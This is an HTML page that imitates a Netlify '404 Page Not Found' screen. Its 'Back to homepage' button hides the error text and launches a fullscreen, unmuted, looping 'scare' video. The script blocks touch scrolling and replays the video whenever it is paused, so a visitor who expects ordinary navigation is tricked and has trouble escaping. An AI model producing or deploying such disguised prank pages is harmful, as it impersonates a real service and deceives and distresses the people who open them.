<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Page Not Found | Netlify</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
                   Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
      background-color: #ffffff;
      color: #2e2e2e;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      flex-direction: column;
    }

    h1 {
      font-size: 64px;
      margin-bottom: 10px;
    }

    p {
      font-size: 18px;
      margin: 5px 0;
      max-width: 500px;
    }

    .code {
      font-size: 14px;
      color: #999;
      margin-top: 10px;
    }

    button {
      margin-top: 25px;
      background-color: #00ad9f;
      color: white;
      padding: 10px 20px;
      font-size: 15px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    video {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      z-index: 9999;
      display: none;
    }
  </style>
</head>
<body>

  <div id="error-screen">
    <h1>Page Not Found</h1>
    <p>Looks like you've followed a broken link or entered a URL that doesn't exist on this site.</p>
    <p class="code">Error Code: 404</p>
    <button id="returnBtn">Back to homepage</button>
  </div>

  <video id="scareVideo" preload="auto" loop muted playsinline>
    <source src="https://example.com/tu-video.mp4" type="video/mp4" />
    Your browser does not support the video tag.
  </video>

  <script>
    const btn = document.getElementById('returnBtn');
    const video = document.getElementById('scareVideo');
    const errorScreen = document.getElementById('error-screen');

    // Prevenir scroll
    document.body.addEventListener('touchmove', function(e) {
      e.preventDefault();
    }, { passive: false });

    btn.addEventListener('click', async () => {
      try {
        errorScreen.style.display = 'none';
        video.style.display = 'block';
        video.loop = true;
        video.muted = false;
        video.volume = 1.0;

        await video.play();

        if (video.requestFullscreen) {
          await video.requestFullscreen();
        } else if (video.webkitEnterFullscreen) {
          video.webkitEnterFullscreen();
        }
      } catch (e) {
        video.style.display = 'block';
        video.play();
      }
    });

    // Reanudar si se pausa accidentalmente
    video.addEventListener('pause', () => {
      video.play().catch(() => {});
    });
  </script>

</body>
</html>
